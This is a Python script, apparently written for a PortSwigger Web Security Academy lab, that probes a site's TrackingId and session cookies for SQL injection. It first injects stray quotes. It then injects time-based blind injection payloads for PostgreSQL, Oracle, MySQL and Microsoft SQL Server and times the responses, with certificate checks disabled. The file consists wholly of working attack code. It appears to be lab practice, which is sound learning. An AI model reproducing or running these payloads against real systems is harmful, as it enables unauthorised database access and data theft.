import requests
import threading
import argparse
from colorama import Fore, Style, init
import urllib3
from http.cookies import SimpleCookie

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Example cookie string
url= "https://0ad2002c035a3a3ad86e8b02001a008e.web-security-academy.net/filter?category=Accessories"

cookie_string = """TrackingId=zw51RsOe7vGQo4Ug; session=hKrnzNyS1UHfeRg9VeTcoeqnWhi0AkcR"""

proxies = {
            "http": "http://127.0.0.1:8090",
            "https": "http://127.0.0.1:8090"
        }



def initiate_request_without_time_dealy():
    try:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain,txt/doc, */*',
            'Connection': 'keep-alive'
        }
        cookie_string_mod = cookie_string
        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
        if response.status_code == 200:
                    print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
                    cookies = response.cookies
            
                    ##print cookies
                    for cookie in cookies:
                        print(f"Name: {cookie.name},  Value: {cookie.value}")
        else:
                    print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")        
            # Character to find
        char = ";"
    
        count = 0
        for index, c in enumerate(cookie_string):
            if c == char:
                #if count == 2:
                
                cookie_string_mod = cookie_string[0:index] +"';"+cookie_string[index+1:]
                
                cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                 
                if response.status_code == 200:
                    print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
                    cookies = response.cookies
            
                    ##print cookies
                    for cookie in cookies:
                        print(f"Name: {cookie.name},  Value: {cookie.value}")
                else:
                    print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                count += 1
            else:
                 pass
        # # at End of cookie add '
        cookie_string_mod = cookie_string+"'"
        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
            cookies = response.cookies
    
            ##print cookies
            for cookie in cookies:
                print(f"Name: {cookie.name},  Value: {cookie.value}")
        else:
                print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                count += 1        
    except Exception as e:
        print(Fore.RED + f"Failed: {url} - Error: {str(e)}")
        
        
from time import time        
def initiate_request_with_time_dealy():
    try:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain,txt/doc, */*',
            'Connection': 'keep-alive'
        }
        cookie_string_mod = cookie_string
        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

        startTime = time()
        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
        endTime = time()
	
        finalTime = endTime - startTime

        if finalTime >= 10:
            print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
        else:
            print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')

        
            # Character to find
        char = ";"
    
        count = 0
        for index, c in enumerate(cookie_string):
            if c == char:
                #if count == 2:
                
                cookie_string_mod = cookie_string[0:index] +"'||pg_sleep(10)--;"+cookie_string[index+1:]
                
                cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                startTime = time()
                response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                endTime = time()
	
                finalTime = endTime - startTime

                if finalTime >= 10:
                    print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
                else:
                    print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
                ################## Oracle delay
                cookie_string_mod = cookie_string[0:index] +"'||dbms_pipe.receive_message(('a'),10);"+cookie_string[index+1:]
                
                cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                startTime = time()
                response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                endTime = time()
	
                finalTime = endTime - startTime

                if finalTime >= 10:
                    print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
                else:
                    print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
                ################## MYsql delay
                cookie_string_mod = cookie_string[0:index] +"'||SELECT sleep(10); "+cookie_string[index+1:]
                
                cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                startTime = time()
                response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                endTime = time()
	
                finalTime = endTime - startTime

                if finalTime >= 10:
                    print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
                else:
                    print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')

                ################## Microsoft delay
                cookie_string_mod = cookie_string[0:index] +"'||WAITFOR DELAY '0:0:10'--; "+cookie_string[index+1:]
                
                cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                startTime = time()
                response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                endTime = time()
	
                finalTime = endTime - startTime

                if finalTime >= 10:
                    print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
                else:
                    print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
                count += 1
            else:
                 pass
        # # at End of cookie add '
        cookie_string_mod = cookie_string+"'"
        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
            cookies = response.cookies
    
            ##print cookies
            for cookie in cookies:
                print(f"Name: {cookie.name},  Value: {cookie.value}")
        else:
                print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                count += 1        
    except Exception as e:
        print(Fore.RED + f"Failed: {url} - Error: {str(e)}")
                


initiate_request_without_time_dealy()
initiate_request_with_time_dealy()